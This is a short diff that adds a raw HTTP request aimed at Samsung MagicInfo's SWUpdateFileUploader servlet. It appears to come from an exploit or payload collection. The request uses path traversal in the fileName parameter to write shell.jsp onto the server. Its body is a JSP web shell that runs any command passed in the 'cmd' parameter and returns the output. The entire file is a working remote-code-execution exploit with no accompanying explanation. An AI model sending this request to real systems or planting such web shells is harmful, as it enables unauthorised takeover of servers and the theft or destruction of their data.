@@ -1,0 +1,10 @@
+POST /MagicInfo/servlet/SWUpdateFileUploader?fileName=../../../../../../server/shell.jsp HTTP/1.1
+Host: 127.0.0.1:7002
+User-Agent: User-Agent: Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko
+Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*
+Accept-Language: en-us
+Connection: Keep-Alive
+Content-Type: text/plain
+Content-Length: 347
+
+<%@ page import="java.util.*,java.io.*"%><pre><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } %></pre>
